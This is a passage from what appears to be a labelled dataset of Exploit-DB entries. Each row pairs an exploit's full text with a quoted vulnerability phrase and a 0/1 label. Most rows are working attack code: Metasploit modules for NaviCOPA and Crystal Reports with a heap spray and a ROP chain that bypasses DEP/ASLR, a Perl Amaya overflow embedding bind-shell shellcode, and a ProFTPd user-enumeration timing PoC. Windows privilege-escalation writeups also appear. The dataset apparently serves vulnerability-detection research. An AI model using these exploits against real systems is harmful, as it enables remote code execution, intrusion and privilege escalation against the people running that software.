'Platform'       => 'win', 			'Targets'        => 				[ 					['NaviCOPA 2.0.1 Universal', { 'Ret' => 0x1009b4ff }], # IV320009.dll 				], 			'DisclosureDate' => 'Sep 28 2006', 			'DefaultTarget'  => 0))  		register_options( 			[ 				Opt::RPORT(80) 			], self.class ) 	end  	def check 		connect  		sock.put(""GET / HTTP/1.0\r\n\r\n"") 		resp = sock.get_once 		disconnect  		if (resp =~ /2.01 11th September/) 			return Exploit::CheckCode::Vulnerable 		end 		return Exploit::CheckCode::Safe 	end  	def exploit 		connect  		sploit =  rand_text_alphanumeric(228, payload_badchars) 		sploit << [target.ret].pack('V') + payload.encoded  		uri = '/' + sploit  		res = ""GET #{uri} HTTP/1.1\r\n\r\n""  		print_status(""Trying target %s"" % target.name)  		sock.put(res) 		sock.close  		handler 		disconnect 	end  end",a specially crafted GET request,1
23472,"Crystal Reports CrystalPrintControl - ActiveX ServerResourceVersion Property Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::RopDb 	include Msf::Exploit::Remote::BrowserAutopwn  	autopwn_info({ 		:ua_name    => HttpClients::IE, 		:ua_minver  => ""6.0"", 		:ua_maxver  => ""8.0"", 		:javascript => true, 		:os_name    => OperatingSystems::WINDOWS, 		:rank       => NormalRanking, 		:classid    => ""{88DD90B6-C770-4CFF-B7A4-3AFD16BB8824}"", 		:method     => ""ServerResourceVersion"" 	})   	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""Crystal Reports CrystalPrintControl ActiveX ServerResourceVersion Property Overflow"", 			'Description'    => %q{ 					This module exploits a heap based buffer overflow in the CrystalPrintControl 				ActiveX, while handling the ServerResourceVersion property. The affected control 				can be found in the PrintControl.dll component as included with Crystal Reports 				2008. This module has been tested successfully on IE 6, 7 and 8 on Windows XP SP3 				and IE 8 on Windows 7 SP1. The module uses the msvcr71.dll library, loaded by the 				affected ActiveX control, to bypass DEP and ASLR. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Dmitriy Pletnev', # Vulnerability discovery 					'Dr_IDE', # PoC 					'juan vazquez' # Metasploit 				], 			'References'     => 				[ 					[ 'CVE', '2010-2590' ], 					[ 'OSVDB', '69917' ], 					[ 'BID', '45387' ], 					[ 'EDB', '15733' ] 				], 			'Payload'        => 				{ 					'Space' => 890, 					'BadChars' => ""\x00"", 					'DisableNops' => true, 					'PrependEncoder' => ""\x81\xc4\xa4\xf3\xfe\xff"" # Stack adjustment # add esp, -500 				}, 			'DefaultOptions'  => 				{ 					'InitialAutoRunScript' => 'migrate -f' 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					# Using jre rop because msvcr71.dll is installed with the ActiveX control 					# Crystal Reports 2008 / PrintControl.dll 12.0.0.683 					[ 'Automatic', {} ], 					[ 'IE 6 on Windows XP SP3', 						{ 							'Rop' => nil, 							'Offset' => '0x5F4', 							'Ret' => 0x0c0c0c08 						} 					], 					[ 'IE 7 on Windows XP SP3', 						{ 							'Rop' => nil, 							'Offset' => '0x5F4', 							'Ret' => 0x0c0c0c08 						} 					], 					[ 'IE 8 on Windows XP SP3', 						{ 							'Rop' => :jre, 							'Offset' => '0x5f4', 							'Ret' => 0x0c0c0c0c, 							'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret 						} 					], 					[ 'IE 8 on Windows 7', 						{ 							'Rop' => :jre, 							'Offset' => '0x5f4', 							'Ret' => 0x0c0c0c0c, 							'Pivot' => 0x7c342643 # xchg eax, esp # pop edi # add byte ptr [eax],al # pop ecx # ret 						} 					] 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Dec 14 2010"", 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false]) 			], self.class)  	end  	def get_target(agent) 		#If the user is already specified by the user, we'll just use that 		return target if target.name != 'Automatic'  		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || '' 		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''  		ie_name = ""IE #{ie}""  		case nt 		when '5.1' 			os_name = 'Windows XP SP3' 		when '6.0' 			os_name = 'Windows Vista' 		when '6.1' 			os_name = 'Windows 7' 		end  		targets.each do |t| 			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name)) 				print_status(""Target selected as: #{t.name}"") 				return t 			end 		end  		return nil 	end  	def ie_heap_spray(my_target, p) 		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch)) 		js_nops = Rex::Text.to_unescape(""\x0c""*4, Rex::Arch.endian(target.arch))  		# Land the payload at 0x0c0c0c0c 		# For IE 6, 7, 8 		js = %Q| 		var heap_obj = new heapLib.ie(0x20000); 		var code = unescape(""#{js_code}""); 		var nops = unescape(""#{js_nops}""); 		while (nops.length < 0x80000) nops += nops; 		var offset = nops.substring(0, #{my_target['Offset']}); 		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length); 		while (shellcode.length < 0x40000) shellcode += shellcode; 		var block = shellcode.substring(0, (0x80000-6)/2); 		heap_obj.gc(); 		for (var i=1; i < 0x300; i++) { 			heap_obj.alloc(block); 		} 		var overflow = nops.substring(0, 10); 		|  		js = heaplib(js, {:noobfu => true})  		if datastore['OBFUSCATE'] 			js = ::Rex::Exploitation::JSObfu.new(js) 			js.obfuscate 		end  		return js 	end  	def get_payload(t, cli) 		code = payload.encoded  		# No rop. Just return the payload. 		return code if t['Rop'].nil?  		# Both ROP chains generated by mona.py - See corelan.be 		print_status(""Using JRE ROP"") 		rop_payload = generate_rop_payload('java', code, {'pivot' => [t['Pivot']].pack(""V"")})  		return rop_payload 	end  	def load_exploit_html(my_target, cli) 		p  = get_payload(my_target, cli) 		js = ie_heap_spray(my_target, p)  		# This rop chain can't contain NULL bytes, because of this RopDB isn't used 		# rop chain generated with mona.py 		rop_gadgets = 			[ 				0x7c37653d, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN 				0xfffffdff,	# Value to negate, will become 0x00000201 (dwSize) 				0x7c347f98,	# RETN (ROP NOP) [msvcr71.dll] 				0x7c3415a2,	# JMP [EAX] [msvcr71.dll] 				0xffffffff,	# 				0x7c376402,	# skip 4 bytes [msvcr71.dll] 				0x7c351e05,	# NEG EAX # RETN [msvcr71.dll] 				0x7c345255,	# INC EBX # FPATAN # RETN [msvcr71.dll] 				0x7c352174,	# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 				0x7c344f87,	# POP EDX # RETN [msvcr71.dll] 				0xffffffc0,	# Value to negate, will become 0x00000040 				0x7c351eb1,	# NEG EDX # RETN [msvcr71.dll] 				0x7c34d201,	# POP ECX # RETN [msvcr71.dll] 				0x7c38b001,	# &Writable location [msvcr71.dll] 				0x7c347f97,	# POP EAX # RETN [msvcr71.dll] 				0x7c37a151,	# ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll] 				0x7c378c81,	# PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 				0x7c345c30,	# ptr to 'push esp #  ret ' [msvcr71.dll] 			].pack(""V*"")  		# Allow to easily stackpivot to the payload 		# stored on the sprayed heap 		stackpivot_to_spray = %Q| 			mov esp, 0x0c0c0c10 			ret 		|  		# Space => 0x940 bytes 		# 0x40c: Fill the current CrystalPrintControl object 		# 0x8: Overflow next heap chunk header 		# 0x52c: Overflow next CrystalPrintControl object until the ServerResourceVersion offset 		bof = rand_text_alpha(1036) 		bof << [0x01010101].pack(""V"") # next heap chunk header 		bof << [0x01010101].pack(""V"") # next heap chunk header 		bof << [my_target.ret].pack(""V"") 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 		bof << [0x7c3410c4].pack(""V"") # ret # msvcr71 # eip for w7 sp0 / ie8 		bof << rop_gadgets 		bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, stackpivot_to_spray).encode_string 		bof << rand_text_alpha(0x940 - bof.length)  		js_bof = Rex::Text.to_unescape(bof, Rex::Arch.endian(my_target.arch))  		target = rand_text_alpha(5 + rand(3)) 		target2 = rand_text_alpha(5 + rand(3)) 		target3 = rand_text_alpha(5 + rand(3)) 		target4 = rand_text_alpha(5 + rand(3)) 		target5 = rand_text_alpha(5 + rand(3)) 		target6 = rand_text_alpha(5 + rand(3)) 		target7 = rand_text_alpha(5 + rand(3)) 		target8 = rand_text_alpha(5 + rand(3)) 		target9 = rand_text_alpha(5 + rand(3)) 		target10 = rand_text_alpha(5 + rand(3)) 		target11 = rand_text_alpha(5 + rand(3)) 		target12 = rand_text_alpha(5 + rand(3)) 		target13 = rand_text_alpha(5 + rand(3)) 		target14 = rand_text_alpha(5 + rand(3)) 		target15 = rand_text_alpha(5 + rand(3))  		# - 15 CrystalPrintControl objects are used to defragement the heap. 		# - The 10th CrystalPrintControl is overflowed. 		# - After the overflow, trying to access the overflowed object, control 		# can be obtained. 		html = %Q| 		<html> 		<head> 		<script> 		#{js} 		</script> 		</head> 		<body> 		<object id='#{target}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target2}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target3}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target4}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target5}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target6}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target7}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target8}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target9}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target10}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target11}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target12}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target13}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target14}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<object id='#{target15}' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object> 		<script> 		var ret = unescape('#{js_bof}'); 		#{target9}.ServerResourceVersion = ret; 		var c = #{target10}.BinName.length; 		</script> 		</body> 		</html> 		|  		return html 	end  	def on_request_uri(cli, request) 		agent = request.headers['User-Agent'] 		uri   = request.uri 		print_status(""Requesting: #{uri}"")  		my_target = get_target(agent) 		# Avoid the attack if no suitable target found 		if my_target.nil? 			print_error(""Browser not supported, sending 404: #{agent}"") 			send_not_found(cli) 			return 		end  		html = load_exploit_html(my_target, cli) 		html = html.gsub(/^\t\t/, '') 		print_status(""Sending HTML..."") 		send_response(cli, html, {'Content-Type'=>'text/html'}) 	end  end",a specially crafted sequence,1
581,"ProFTPd 1.2.10 - Remote Users Enumeration /*  Details  Vulnerable Systems: * ProFTPD Version 1.2.10 and below  It is possible to determine which user names are valid, which are special, and which ones do not exist on the remote system. This can be accomplished by code execution path timing analysis attack at the ProFTPd login procedure. There is a very small (but significant) difference in time delay of code execution path between valid and non-valid user names. That can be used to remotely determine the difference between existent and non-existent users. The time delay can be measured by using a simple FTP client that will calculate elapsed time between 'USER' command sent by client, and the server response. Because of the very short response period, elapsed time should be measured in microseconds.  Proof of Concept Code: LSS has developed simple PoC exploit that is presented here:  // ProFTPd remote users discovery based on code execution time - POC exploit // Coded by Leon Juranic // http://www.lss.hr */  #include <sys/socket.h> #include <sys/types.h> #include <stdio.h> #include <arpa/inet.h> #include <sys/time.h>  #define PORT 21 #define PROBE 8  main (int argc, char **argv) { int sock,n,y; long dist,stat=0; struct sockaddr_in sin; char buf[1024], buf2[1024]; struct timeval tv, tv2; struct timezone tz, tz2;  printf (""Proftpd remote users discovery exploit\n"" "" Coded by Leon / LSS Security\n"" "">-------------------------------------<\n"");  if (argc != 3) { printf (""usage: %s "",argv[0]); exit(0); }  sock = socket (AF_INET, SOCK_STREAM, 0); sin.sin_family = AF_INET; sin.sin_port = htons (PORT); sin.sin_addr.s_addr = inet_addr (argv[1]); bzero (sin.sin_zero,8);  connect (sock, (struct sockaddr*)&sin, sizeof(struct sockaddr));  printf (""Login time: ""); n = read (sock,buf2, sizeof(buf2)); for (y=0;y<PROBE;y++) { gettimeofday (&tv,&tz); snprintf (buf, sizeof(buf)-1,""USER %s\r\n"",argv[2]); write (sock, buf, strlen(buf)); n = read (sock,buf2, sizeof(buf2)); gettimeofday (&tv2,&tz2); dist =tv2.tv_usec - tv.tv_usec; stat += dist; printf ("" %d |"",dist); } printf (""\nAvrg: %d\n"",(stat/PROBE)); close (sock); }  // milw0rm.com [2004-10-17]",code execution path timing analysis attack at the ProFTPd login procedure,1
22513,MPCSoftWeb 1.0 - Database Disclosure source: https://www.securityfocus.com/bid/7390/info  MPCSoftWeb does not sufficiently secure the database file. It is possible for remote attackers to request the database file and gain access to sensitive information such as administrative credentials for the guestbook.   http://www.example.com/mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb,request the database file and gain access to sensitive information such as administrative credentials for the guestbook,1
7989,"Amaya Web Browser 11 (Windows Vista) - bdo tag Remote Stack Overflow #!/usr/bin/perl  ############################################# # #   Amaya 11 bdo tag stack overflow # #   author: Rob Carter (cartrel@hotmail.com) # #   targets: windows vista sp1 # #   modified the alpha-numeric shell-code #   from metasploit since the first 12 bytes #   didn't fall within the ASCII range of #   0x01-0x7f. otherwise my payload would #   have been corrupted on the stack. wrote #   a 47-byte decoder to repair the shell- #   code to its original state. # #   this exploit bypasses safeSEH by jumping #   to a pop pop push pop ret sequence in #   one of the amaya modules that has a #   constant base address in memory. ret's #   back to the stack, short jump over the #   overwritten SEH, decodes the first 12 #   bytes of the shellcode and then runs #   the repaired shellcode to bind a shell #   on port 1337. # #   $ perl amaya_sploit.pl > pwn.html # #   the author is not responsible for any misuse of #   this code. it is intended for educational #   purposes only # #############################################  # win32_bind -  EXITFUNC=seh LPORT=1337 Size=709 Encoder=PexAlphaNum http://metasploit.com my $shellcode = # original first 12 bytes of shellcode: # ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49"". ""\x7f\x01\x01\x7f\x03\x68\x78\x70\x6f\x6f\x3d\x37"". ""\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"". ""\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x48"". ""\x4e\x46\x46\x42\x46\x42\x4b\x58\x45\x44\x4e\x33\x4b\x38\x4e\x47"". ""\x45\x50\x4a\x47\x41\x50\x4f\x4e\x4b\x48\x4f\x34\x4a\x41\x4b\x38"". ""\x4f\x45\x42\x32\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x53\x4b\x58"". ""\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"". ""\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x33\x46\x55\x46\x32\x4a\x52\x45\x37\x45\x4e\x4b\x48"". ""\x4f\x55\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x38\x4e\x30\x4b\x54"". ""\x4b\x48\x4f\x35\x4e\x41\x41\x30\x4b\x4e\x43\x50\x4e\x32\x4b\x48"". ""\x49\x48\x4e\x36\x46\x52\x4e\x31\x41\x56\x43\x4c\x41\x53\x4b\x4d"". ""\x46\x56\x4b\x48\x43\x54\x42\x53\x4b\x58\x42\x44\x4e\x30\x4b\x48"". ""\x42\x37\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x30\x50\x45\x4a\x56"". ""\x50\x38\x50\x54\x50\x50\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x36"". ""\x43\x35\x48\x36\x4a\x46\x43\x43\x44\x43\x4a\x46\x47\x37\x43\x47"". ""\x44\x33\x4f\x55\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"". ""\x4e\x4f\x4b\x33\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"". ""\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x55\x4c\x36\x44\x50"". ""\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x35"". ""\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x45\x43\x35\x43\x55\x43\x54"". ""\x43\x45\x43\x34\x43\x35\x4f\x4f\x42\x4d\x48\x46\x4a\x56\x45\x30"". ""\x49\x43\x48\x36\x43\x45\x49\x48\x41\x4e\x45\x59\x4a\x36\x46\x4a"". ""\x4c\x51\x42\x57\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x56\x42\x41"". ""\x41\x45\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x32"". ""\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x45\x45\x35\x4f\x4f\x42\x4d"". ""\x4a\x36\x45\x4e\x49\x44\x48\x48\x49\x44\x47\x55\x4f\x4f\x48\x4d"". ""\x42\x55\x46\x45\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x36"". ""\x47\x4e\x49\x37\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x55"". ""\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x46\x48\x56\x4a\x36\x43\x56"". ""\x4d\x56\x49\x38\x45\x4e\x4c\x56\x42\x55\x49\x35\x49\x52\x4e\x4c"". ""\x49\x48\x47\x4e\x4c\x56\x46\x34\x49\x58\x44\x4e\x41\x53\x42\x4c"". ""\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x32\x50\x4f\x44\x34\x4e\x32"". ""\x43\x49\x4d\x48\x4c\x57\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"". ""\x44\x37\x50\x4f\x43\x4b\x48\x31\x4f\x4f\x45\x47\x46\x54\x4f\x4f"". ""\x48\x4d\x4b\x45\x47\x45\x44\x55\x41\x35\x41\x35\x41\x45\x4c\x56"". ""\x41\x50\x41\x45\x41\x55\x45\x55\x41\x45\x4f\x4f\x42\x4d\x4a\x56"". ""\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x56"". ""\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x38\x47\x45\x4e\x4f"". ""\x43\x38\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"". ""\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x45\x4f\x4f\x48\x4d"". ""\x4f\x4f\x42\x4d\x5a"";  $decoder = ""\x5b"".			# pop ebx ""\x5b"".			# pop ebx ""\x68\x6c\x02\x58\x6c"".	# push 0x6c58026c ""\x58"".			# pop eax ""\x01\x43\x38"".		# add dword ptr[ebx+38],eax ""\x68\x01\x01\x01\x10"".	# push 0x10010101 ""\x58"".			# pop eax ""\x01\x43\x3c"".		# add dword ptr[ebx+3c],eax ""\x68\x01\x7f\x7f\x7f"".	# push 0x7f7f7f01 ""\x58"".			# pop eax ""\x01\x43\x3c"".		# add dword ptr[ebx+3c],eax ""\x68\x11\x11\x01\x01"".	# push 0x01011111 ""\x58"".			# pop eax ""\x01\x43\x40"".		# add dword ptr[ebx+40],eax ""\x68\x7f\x7f\x11\x11"".	# push 0x11117f7f ""\x58"".			# pop eax ""\x01\x43\x40"";		# add dword ptr[ebx+40],eax  $payload = ""<bdo dir=\"""". ""A"" x 6905 . ""\x74\x06\x41\x41"". ""\x51\x55\x03\x10"".	# pop - pop - push - pop - ret 0c $decoder. ""A"". $shellcode. ""\"">pwnd!</bdo>"";  print $payload;  # milw0rm.com [2009-02-04]",jumping to a pop pop push pop ret sequence in one of the amaya modules that has a constant base address in memory,1
44315,"Microsoft Windows - Desktop Bridge Virtual Registry NtLoadKey Arbitrary File Read/Write Privilege Escalation Windows: Desktop Bridge Virtual Registry NtLoadKey Arbitrary File Read/Write EoP Platform: Windows 1703 (version 1709 seems to have fixed this bug) Class: Elevation of Privilege  Summary: The handling of the virtual registry NtLoadKey callback reloads registry hives insecurely leading to arbitrary file creation resulting in EoP.  Description:  NOTE: This bug seems to have been fixed in 1709, but the fix hasn’t been backported to 1703 (I’ve not checked 1607). I don’t know if the fix was intentional or not, however as (according to https://support.microsoft.com/en-gb/help/13853/windows-lifecycle-fact-sheet) 1703 should be supported until at least September 2018 this should be something you’d consider fixing.  The desktop bridge functionality introduced in Anniversary edition allows an application to set up a virtual registry to add changes to system hives and user hives without actually modifying the real hives. This is implemented through the normal registry callback functionality. One of the callbacks implemented is to handle the NtLoadKey system call (VrpPreLoadKey). On 1703 it doesn’t check for the Application Key flag, but then recalls ZwLoadKey with the arguments passed by the user mode caller. This effectively allows you to circumvent the requirement for SeRestorePrivilege as will also create a new hive file with kernel privileges in the context of the current user. This is a trivial EoP by dropping a arbitrary file to disk then getting system privileges.  Proof of Concept:  I’ve provided a PoC as a C# project. In order for the exploit to work you need a copy of the Get Office/My Office application installed (I tested with version 17.8830.7600.0). It could be any desktop bridge application however as you just need to run a program inside the container. Again I’ll note that this will only work on 1703 as the code seems to have been fixed in 1709. The registry hives files it creates will be locked (we can’t easily unload the hive) until reboot although it’s probably possible to trick the system into failing the load while still creating some files.  1) Compile the C# project. It will need to grab the NtApiDotNet from NuGet to work. 2) Start the Get Office/My Office application 3) Start the poc. It should print that it successfully created the registry files.  Expected Result: Loading the registry key should fail.  Observed Result: The registry key is loaded and the file test.hiv has been created in the windows folder with full access for the current user.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/44315.zip",insecurely,0
25066,"WebWasher Classic 2.2/2.3 - HTTP CONNECT Unauthorized Access source: https://www.securityfocus.com/bid/12394/info  It is reported that WebWasher Classic is prone to a weakness that may allow remote attackers to connect to arbitrary ports on a vulnerable computer.  This weakness may be combined with other attacks to exploit latent vulnerabilities. An attacker can bypass access controls implemented by the application through this attack.  WebWasher Classic 3.3 and 2.2.1 are reported prone to this weakness. Other versions may be affected as well.   The following proof of concept is available: 1) Start a netcat listener on the WebWasher system: netcat -L -p 99 -s 127.0.0.1 < hallo.txt 2) Connect to the WebWasher proxy port (default 8080/tcp) 3) Enter command ""CONNECT 127.0.0.1:99 HTTP/1.0""  As a result, content of hallo.txt will appear.",malicious code,1
45436,"Microsoft Windows - Double Dereference in NtEnumerateKey Elevation of Privilege Windows: Double Dereference in NtEnumerateKey Elevation of Privilege Platform: Windows 10 1803 (not vulnerable in earlier versions) Class: Elevation of Privilege  Summary: A number of registry system calls do not correctly handle pre-defined keys resulting in a double dereference which can lead to EoP.  Description:  The registry contains a couple of predefined keys, to generate performance information. These actually exist in the the machine hive under \Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib. When these keys are opened the kernel returns a status code of STATUS_PREDEFINED_KEY, but it also returns a handle to the key.   The kernel doesn’t allow these keys to be used for many operations such as enumeration of subkeys and values, so these system calls check before the key is used and returns STATUS_INVALID_HANDLE. The code for this in NtEnumerateKey looks like the following:  status = ObReferenceObjectByHandle(Handle, KEY_ENUMERATE, CmKeyObjectType, &Object); if ( status >= 0 && Object->Type != 'ky02' )  {       status = STATUS_INVALID_HANDLE;       ObfDereferenceObject(Object); <-- Dereference object,  }  if (status < 0) {    goto EXIT_LABEL;  }  This code in itself is fine, but in 1803 at the exit label we find the following additional code:  if (Object)     ObfDereferenceObject(Object);  This results in the object being dereferenced twice. Due the way the object reference counting works this will not be noticed until the key handle is closed, which results in a REFERENCE_BY_POINTER bugcheck being generated. This might only be a local DoS if the issue was caught earlier, but because the caller can do other things with the corrupted object we can potentially turn this into a UaF and from there elevate privileges. For example the provided PoC passes the handle to NtDuplicateObject which results in the kernel modifying a free pool allocation.  I’d recommend ensuring you check all similar functions such as NtEnumerateValueKey as there seems to be a common issue, perhaps it’s a macro or template which is generating the bad code.  The following is an example dump from a crash, at the end the !pool command is used on the object address to demonstrate the memory allocation was freed before being modified.  Use !analyze -v to get detailed debugging information.  BugCheck 18, {0, ffff8e0db3a0f7a0, 2, ffffffffffffffff}  Probably caused by : ntkrnlmp.exe ( nt!ObfDereferenceObjectWithTag+155dd9 )  Followup:     MachineOwner ---------  0: kd> !analyze -v ******************************************************************************* *                                                                             * *                        Bugcheck Analysis                                    * *                                                                             * *******************************************************************************  REFERENCE_BY_POINTER (18) Arguments: Arg1: 0000000000000000, Object type of the object whose reference count is being lowered Arg2: ffff8e0db3a0f7a0, Object whose reference count is being lowered Arg3: 0000000000000002, Reserved Arg4: ffffffffffffffff, Reserved 	The reference count of an object is illegal for the current state of the object. 	Each time a driver uses a pointer to an object the driver calls a kernel routine 	to increment the reference count of the object. When the driver is done with the 	pointer the driver calls another kernel routine to decrement the reference count. 	Drivers must match calls to the increment and decrement routines. This bugcheck 	can occur because an object's reference count goes to zero while there are still 	open handles to the object, in which case the fourth parameter indicates the number 	of opened handles. It may also occur when the objects reference count drops below zero 	whether or not there are open handles to the object, and in that case the fourth parameter 	contains the actual value of the pointer references count.  Debugging Details: ------------------   DUMP_CLASS: 1  DUMP_QUALIFIER: 401  BUILD_VERSION_STRING:  17134.1.amd64fre.rs4_release.180410-1804  SYSTEM_MANUFACTURER:  Microsoft Corporation  VIRTUAL_MACHINE:  HyperV  SYSTEM_PRODUCT_NAME:  Virtual Machine  SYSTEM_SKU:  None  SYSTEM_VERSION:  Hyper-V UEFI Release v3.0  BIOS_VENDOR:  Microsoft Corporation  BIOS_VERSION:  Hyper-V UEFI Release v3.0  BIOS_DATE:  03/02/2018  BASEBOARD_MANUFACTURER:  Microsoft Corporation  BASEBOARD_PRODUCT:  Virtual Machine  BASEBOARD_VERSION:  Hyper-V UEFI Release v3.0  DUMP_TYPE:  1  BUGCHECK_P1: 0  BUGCHECK_P2: ffff8e0db3a0f7a0  BUGCHECK_P3: 2  BUGCHECK_P4: ffffffffffffffff  CPU_COUNT: 2  CPU_MHZ: a98  CPU_VENDOR:  GenuineIntel  CPU_FAMILY: 6  CPU_MODEL: 8e  CPU_STEPPING: 9  CPU_MICROCODE: 6,8e,9,0 (F,M,S,R)  SIG: FFFFFFFF'00000000 (cache) FFFFFFFF'00000000 (init)  DEFAULT_BUCKET_ID:  WIN8_DRIVER_FAULT  BUGCHECK_STR:  0x18  PROCESS_NAME:  PoC_NtEnumerateKey_EoP.exe  CURRENT_IRQL:  0  ANALYSIS_SESSION_HOST:  DESKTOP-JA4I3EF  ANALYSIS_SESSION_TIME:  06-19-2018 13:36:38.0158  ANALYSIS_VERSION: 10.0.15063.468 amd64fre  LAST_CONTROL_TRANSFER:  from fffff80357473ab9 to fffff8035742c330  STACK_TEXT:   ffffb78e`5a91f678 fffff803`57473ab9 : 00000000`00000018 00000000`00000000 ffff8e0d`b3a0f7a0 00000000`00000002 : nt!KeBugCheckEx ffffb78e`5a91f680 fffff803`57751b9b : 00000000`00000000 00000000`00000000 00020019`00000000 ffffb78e`5a91f7c0 : nt!ObfDereferenceObjectWithTag+0x155dd9 ffffb78e`5a91f6c0 fffff803`5775157d : ffffe58b`763cf580 00000a50`00000040 ffffe58b`75c75f20 00000000`00000001 : nt!ObDuplicateObject+0x58b ffffb78e`5a91f980 fffff803`5743c943 : ffffe58b`763c4700 00000000`008fe098 ffffb78e`5a91fa28 00000000`00000000 : nt!NtDuplicateObject+0x12d ffffb78e`5a91fa10 00007ffa`f3cda634 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x13 00000000`008fe078 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ffa`f3cda634   STACK_COMMAND:  kb  THREAD_SHA1_HASH_MOD_FUNC:  4fc60443ee144421725d502d6e3b53056b889c26  THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  c219a3da6c3050112ed885b130b5ebbab9cdff96  THREAD_SHA1_HASH_MOD:  f08ac56120cad14894587db086f77ce277bfae84  FOLLOWUP_IP:  nt!ObfDereferenceObjectWithTag+155dd9 fffff803`57473ab9 